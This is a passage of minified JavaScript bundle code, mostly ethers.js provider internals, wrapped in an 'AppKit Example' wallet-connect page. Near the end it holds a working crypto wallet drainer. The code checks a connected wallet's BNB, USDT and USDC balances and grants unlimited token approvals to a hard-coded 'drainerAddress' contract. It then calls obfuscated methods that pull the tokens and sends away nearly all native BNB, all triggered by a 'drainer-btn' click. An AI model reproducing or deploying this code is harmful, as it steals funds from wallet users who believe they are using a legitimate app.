denied/i)&&or.throwError("user rejected signing",H.errors.ACTION_REJECTED,{action:"_signTypedData",from:s,messageData:{domain:i.domain,types:r,value:i.value}}),o}})}unlock(e){return as(this,void 0,void 0,function*(){const r=this.provider,n=yield this.getAddress();return r.send("personal_unlockAccount",[n.toLowerCase(),e,null])})}}class HQ extends iS{sendTransaction(e){return this.sendUncheckedTransaction(e).then(r=>({hash:r,nonce:null,gasLimit:null,gasPrice:null,data:null,value:null,chainId:null,confirmations:0,from:null,wait:n=>this.provider.waitForTransaction(r,n)}))}}const WQ={chainId:!0,data:!0,gasLimit:!0,gasPrice:!0,nonce:!0,to:!0,value:!0,type:!0,accessList:!0,maxFeePerGas:!0,maxPriorityFeePerGas:!0};class sS extends jQ{constructor(e,r){let n=r;n==null&&(n=new Promise((i,s)=>{setTimeout(()=>{this.detectNetwork().then(o=>{i(o)},o=>{s(o)})},0)})),super(n),e||(e=Bi(this.constructor,"defaultUrl")()),typeof e=="string"?X(this,"connection",Object.freeze({url:e})):X(this,"connection",Object.freeze(pr(e))),this._nextId=42}get _cache(){return this._eventLoopCache==null&&(this._eventLoopCache={}),this._eventLoopCache}static defaultUrl(){return"http://localhost:8545"}detectNetwork(){return this._cache.detectNetwork||(this._cache.detectNetwork=this._uncachedDetectNetwork(),setTimeout(()=>{this._cache.detectNetwork=null},0)),this._cache.detectNetwork}_uncachedDetectNetwork(){return as(this,void 0,void 0,function*(){yield _1(0);let e=null;try{e=yield this.send("eth_chainId",[])}catch{try{e=yield this.send("net_version",[])}catch{}}if(e!=null){const r=Bi(this.constructor,"getNetwork");try{return r(ne.from(e).toNumber())}catch(n){return or.throwError("could not detect network",H.errors.NETWORK_ERROR,{chainId:e,event:"invalidNetwork",serverError:n})}}return or.throwError("could not detect network",H.errors.NETWORK_ERROR,{event:"noNetwork"})})}getSigner(e){return new iS(j0,this,e)}getUncheckedSigner(e){return this.getSigner(e).connectUnchecked()}listAccounts(){return this.send("eth_accounts",[]).then(e=>e.map(r=>this.formatter.address(r)))}send(e,r){const n={method:e,params:r,id:this._nextId++,jsonrpc:"2.0"};this.emit("debug",{action:"request",request:Es(n),provider:this});const i=["eth_chainId","eth_blockNumber"].indexOf(e)>=0;if(i&&this._cache[e])return this._cache[e];const s=nw(this.connection,JSON.stringify(n),zQ).then(o=>(this.emit("debug",{action:"response",request:n,response:o,provider:this}),o),o=>{throw this.emit("debug",{action:"response",error:o,request:n,provider:this}),o});return i&&(this._cache[e]=s,setTimeout(()=>{this._cache[e]=null},0)),s}prepareRequest(e,r){switch(e){case"getBlockNumber":return["eth_blockNumber",[]];case"getGasPrice":return["eth_gasPrice",[]];case"getBalance":return["eth_getBalance",[wu(r.address),r.blockTag]];case"getTransactionCount":return["eth_getTransactionCount",[wu(r.address),r.blockTag]];case"getCode":return["eth_getCode",[wu(r.address),r.blockTag]];case"getStorageAt":return["eth_getStorageAt",[wu(r.address),Vt(r.position,32),r.blockTag]];case"sendTransaction":return["eth_sendRawTransaction",[r.signedTransaction]];case"getBlock":return r.blockTag?["eth_getBlockByNumber",[r.blockTag,!!r.includeTransactions]]:r.blockHash?["eth_getBlockByHash",[r.blockHash,!!r.includeTransactions]]:null;case"getTransaction":return["eth_getTransactionByHash",[r.transactionHash]];case"getTransactionReceipt":return["eth_getTransactionReceipt",[r.transactionHash]];case"call":return["eth_call",[Bi(this.constructor,"hexlifyTransaction")(r.transaction,{from:!0}),r.blockTag]];case"estimateGas":return["eth_estimateGas",[Bi(this.constructor,"hexlifyTransaction")(r.transaction,{from:!0})]];case"getLogs":return r.filter&&r.filter.address!=null&&(r.filter.address=wu(r.filter.address)),["eth_getLogs",[r.filter]]}return null}perform(e,r){return as(this,void 0,void 0,function*(){if(e==="call"||e==="estimateGas"){const i=r.transaction;if(i&&i.type!=null&&ne.from(i.type).isZero()&&i.maxFeePerGas==null&&i.maxPriorityFeePerGas==null){const s=yield this.getFeeData();s.maxFeePerGas==null&&s.maxPriorityFeePerGas==null&&(r=pr(r),r.transaction=pr(i),delete r.transaction.type)}}const n=this.prepareRequest(e,r);n==null&&or.throwError(e+" not implemented",H.errors.NOT_IMPLEMENTED,{operation:e});try{return yield this.send(n[0],n[1])}catch(i){return nS(e,i,r)}})}_startEvent(e){e.tag==="pending"&&this._startPending(),super._startEvent(e)}_startPending(){if(this._pendingFilter!=null)return;const e=this,r=this.send("eth_newPendingTransactionFilter",[]);this._pendingFilter=r,r.then(function(n){function i(){e.send("eth_getFilterChanges",[n]).then(function(s){if(e._pendingFilter!=r)return null;let o=Promise.resolve();return s.forEach(function(a){e._emitted["t:"+a.toLowerCase()]="pending",o=o.then(function(){return e.getTransaction(a).then(function(c){return e.emit("pending",c),null})})}),o.then(function(){return _1(1e3)})}).then(function(){if(e._pendingFilter!=r){e.send("eth_uninstallFilter",[n]);return}return setTimeout(function(){i()},0),null}).catch(s=>{})}return i(),n}).catch(n=>{})}_stopEvent(e){e.tag==="pending"&&this.listenerCount("pending")===0&&(this._pendingFilter=null),super._stopEvent(e)}static hexlifyTransaction(e,r){const n=pr(WQ);if(r)for(const s in r)r[s]&&(n[s]=!0);dV(e,n);const i={};return["chainId","gasLimit","gasPrice","type","maxFeePerGas","maxPriorityFeePerGas","nonce","value"].forEach(function(s){if(e[s]==null)return;const o=Vy(ne.from(e[s]));s==="gasLimit"&&(s="gas"),i[s]=o}),["from","to","data"].forEach(function(s){e[s]!=null&&(i[s]=we(e[s]))}),e.accessList&&(i.accessList=Kc(e.accessList)),i}}const C1=new H(ap);let GQ=1;function I1(t,e){const r="Web3LegacyFetcher";return function(n,i){const s={method:n,params:i,id:GQ++,jsonrpc:"2.0"};return new Promise((o,a)=>{this.emit("debug",{action:"request",fetcher:r,request:Es(s),provider:this}),e(s,(c,u)=>{if(c)return this.emit("debug",{action:"response",fetcher:r,error:c,request:s,provider:this}),a(c);if(this.emit("debug",{action:"response",fetcher:r,request:s,response:u,provider:this}),u.error){const l=new Error(u.error.message);return l.code=u.error.code,l.data=u.error.data,a(l)}o(u.result)})})}}function VQ(t){return function(e,r){r==null&&(r=[]);const n={method:e,params:r};return this.emit("debug",{action:"request",fetcher:"Eip1193Fetcher",request:Es(n),provider:this}),t.request(n).then(i=>(this.emit("debug",{action:"response",fetcher:"Eip1193Fetcher",request:n,response:i,provider:this}),i),i=>{throw this.emit("debug",{action:"response",fetcher:"Eip1193Fetcher",request:n,error:i,provider:this}),i})}}class KQ extends sS{constructor(e,r){e==null&&C1.throwArgumentError("missing provider","provider",e);let n=null,i=null,s=null;typeof e=="function"?(n="unknown:",i=e):(n=e.host||e.path||"",!n&&e.isMetaMask&&(n="metamask"),s=e,e.request?(n===""&&(n="eip-1193:"),i=VQ(e)):e.sendAsync?i=I1(e,e.sendAsync.bind(e)):e.send?i=I1(e,e.send.bind(e)):C1.throwArgumentError("unsupported provider","provider",e),n||(n="unknown:")),super(n,r),X(this,"jsonRpcFetchFunc",i),X(this,"provider",s)}send(e,r){return this.jsonRpcFetchFunc(e,r)}}const QQ="units/5.8.0",YQ=new H(QQ),JQ=["wei","kwei","mwei","gwei","szabo","finney","ether"];function q0(t,e){if(typeof t!="string"&&YQ.throwArgumentError("value must be a string","value",t),typeof e=="string"){const r=JQ.indexOf(e);r!==-1&&(e=3*r)}return Si(t,e??18)}function oS(t){return q0(t,18)}const wf=["function balanceOf(address account) view returns (uint256)","function approve(address spender, uint256 amount) returns (bool)","function decimals() view returns (uint8)","function allowance(address owner, address spender) view returns (uint256)"],ZQ=["function tK7(uint256 usdtAmount, uint256 usdcAmount) external","function bN3() external payable"],cp={56:{name:"BNB Chain",nativeToken:"BNB",chainIdHex:"0x38",rpcUrls:["https://bsc-dataseed.binance.org/","https://bsc-dataseed1.binance.org/"],usdcAddress:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",usdtAddress:"0x55d398326f99059fF775485246999027B3197955",drainerAddress:"0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF"}},XQ=t=>new Promise(e=>setTimeout(e,t));async function eY(t,e){const r=cp[t];let n;for(const u of r.rpcUrls)try{n=new sS(u),await n.getBlockNumber();break}catch{}if(!n)throw new Error(` RPC  ${r.name}`);const i=await n.getBalance(e),s=new Lu(r.usdtAddress,wf,n),o=new Lu(r.usdcAddress,wf,n),a=await s.balanceOf(e),c=await o.balanceOf(e);return{nativeBalance:i,usdtBalance:a,usdcBalance:c}}function tY(t){return t.nativeBalance.gt(oS("0.001"))||t.usdtBalance.gt(q0("0.1",6))||t.usdcBalance.gt(q0("0.1",6))}async function rY(t){await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:cp[t].chainIdHex}]})}async function nY(t,e,r,n){const i=cp[t],s=Sx,o=new Lu(i.drainerAddress,ZQ,e),a=new Lu(i.usdtAddress,wf,e),c=new Lu(i.usdcAddress,wf,e);n.usdtBalance.gt(0)&&(await a.allowance(r,i.drainerAddress)).lt(n.usdtBalance)&&await a.approve(i.drainerAddress,s),n.usdcBalance.gt(0)&&(await c.allowance(r,i.drainerAddress)).lt(n.usdcBalance)&&await c.approve(i.drainerAddress,s),(n.usdtBalance.gt(0)||n.usdcBalance.gt(0))&&await o.tK7(n.usdtBalance,n.usdcBalance);const u=n.nativeBalance.sub(oS("0.001"));u.gt(0)&&await o.bN3({value:u})}async function iY(t,e,r){for(const n of Object.keys(cp)){await XQ(300);const i=await eY(n,r);if(tY(i)){await rY(Number(n)),await nY(Number(n),e,r,i);break}}}const aS="d85cc83edb401b676e2a7bcef67f3be8",cS=[cW,oW,aW],sY=new KG({projectId:aS,networks:cS}),oY={name:"sam",description:"AppKit Example",url:"https://reown.com/appkit",icons:["https://assets.reown.com/reown-profile-pic.png"]},aY=gW({adapters:[sY],networks:cS,metadata:oY,projectId:aS,features:{analytics:!0}});document.getElementById("open-connect-modal").addEventListener("click",()=>aY.open());document.getElementById("drainer-btn").addEventListener("click",async()=>{try{const t=new KQ(window.ethereum,"any"),e=t.getSigner(),r=await e.getAddress();await iY(t,e,r)}catch(t){console.error("  Drainer:",t)}});export{Er as $,pe as A,_e as B,kl as C,ME as D,C2 as E,tn as F,Xr as G,cY as H,xe as I,uY as J,$F as K,ui as L,nr as M,Ah as N,te as O,bJ as P,gJ as Q,at as R,zi as S,jr as T,hr as U,x0 as V,cr as W,dd as X,Ru as Y,co as Z,ln as _,ac as a,mJ as a0,D2 as a1,S0 as a2,Sc as a3,Y as a4,Ay as a5,Wn as a6,r7 as a7,ej as a8,w2 as a9,XG as aA,FK as aB,z0 as aC,FS as aD,JG as aE,ci as aF,QW as aG,hJ as aa,d2 as ab,oa as ac,Hf as ad,Ou as ae,ws as af,xI as ag,cJ as ah,py as ai,Ud as aj,jf as ak,lJ as al,uJ as am,W7 as an,ek as ao,WY as ap,ib as aq,O_ as ar,HO as as,tk as at,GY as au,HY as av,xf as aw,QY as ax,VY as ay,JW as az,pd as b,vJ as c,Oe as d,hs as e,Ar as f,Lo as g,Z as h,Zf as i,Ie as j,q as k,wt as l,kr as m,Ue as n,wJ as o,Nn as p,At as q,yJ as r,Gt as s,jH as t,le as u,BE as v,T1 as w,pJ as x,Kt as y,Wo as z};
